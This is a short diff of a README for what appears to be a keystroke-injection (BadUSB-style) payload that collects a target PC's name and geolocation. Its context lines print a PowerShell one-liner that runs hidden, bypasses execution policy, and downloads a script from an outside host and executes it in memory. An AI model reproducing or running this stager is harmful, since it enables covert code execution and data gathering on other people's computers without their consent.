@@ -34,7 +34,7 @@ This program enumerates a target PC to get their Name, GeoLocation (Latitude and
 ### Executing program
 
 * Plug in your device
-* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
+* Invoke-RestMethod will be entered in the Run Box to download and execute the script from memory
 ```
 powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/b8n | iex
 ```
